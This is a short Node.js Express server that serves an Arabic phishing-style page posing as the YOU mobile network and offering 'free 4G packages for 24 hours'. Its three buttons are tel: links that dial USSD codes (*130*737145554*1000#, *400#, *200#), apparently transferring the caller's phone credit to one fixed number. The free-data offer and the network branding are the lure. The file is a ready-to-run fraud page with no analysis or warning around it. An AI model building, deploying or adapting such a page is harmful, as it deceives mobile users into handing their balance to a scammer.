const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// محتوى صفحة HTML الرئيسية
const htmlContent = `
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>الحصول على باقات 4G مجانية - شبكة YOU</title>
  <style>
    body {
      background: #fff8dc;
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      padding: 30px;
    }
    h1 {
      color: #f5a623;
      margin-bottom: 30px;
    }
    .logo-text {
      font-size: 36px;
      font-weight: bold;
      color: #f5a623;
      margin-bottom: 40px;
      user-select: none;
    }
    .btn {
      background-color: #f5a623;
      border: none;
      padding: 15px 30px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 8px;
      margin: 15px auto;
      width: 80%;
      max-width: 320px;
      cursor: pointer;
      color: #fff;
      text-decoration: none;
      display: inline-block;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #d18f1f;
    }
    footer {
      margin-top: 50px;
      font-weight: bold;
      color: #444;
    }
  </style>
</head>
<body>

  <div class="logo-text">باقات 4G مجانية لمدة 24 ساعة</div>

  <a href="tel:*130*737145554*1000%23" class="btn">تجربة المهمة 1</a>
  <a href="tel:*130*737145554*400%23" class="btn">تجربة المهمة 2</a>
  <a href="tel:*130*737145554*200%23" class="btn">تجربة المهمة 3</a>

  <footer>
    شبكة YOU للخدمات
  </footer>

</body>
</html>
`;

// نقطة البداية
app.get('/', (req, res) => {
  res.send(htmlContent);
});

app.listen(port, () => {
  console.log(`🚀 Server is running on port ${port}`);
});